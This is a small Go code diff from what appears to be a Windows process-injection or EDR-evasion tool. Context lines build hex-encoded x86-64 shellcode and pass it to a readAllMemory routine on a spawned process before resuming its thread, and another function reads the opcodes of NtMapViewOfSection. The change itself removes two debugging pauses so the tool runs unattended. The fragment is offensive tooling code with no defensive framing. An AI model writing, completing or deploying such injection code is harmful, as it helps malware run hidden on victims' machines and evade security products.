@@ -109,7 +109,6 @@ func main() {
 	sc, _ := hex.DecodeString(fmt.Sprintf("4883F80190909077414D89E94983C1284D8B094981F900F0FF0F722E49FFC149FFC1418039007422418039%s75EE49FFC149FFC1418039%s75E249FFC149FFC1418039%s75D64D31C9C34D31C9909090909090909090909090909090909090", dllHex[0], dllHex[1], dllHex[2]))
 	readAllMemory(sc, pi.Process)
 	time.Sleep(3 * time.Second)
-	fmt.Scanln()
 	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
 	if err != nil {
 		fmt.Printf("ResumeThread failed: %v", err)
@@ -167,7 +166,7 @@ func getNTMapViewOfSection(hProcess syscall.Handle) (uintptr, []byte, error) {
 		}
 		tmp += 1
 	}
-	fmt.Scanln()
+
 	fmt.Printf("NtMapViewOfSection Code: %x\n", opCode)
 	return NtMapViewOfSectionAddr, opCode, nil
 }
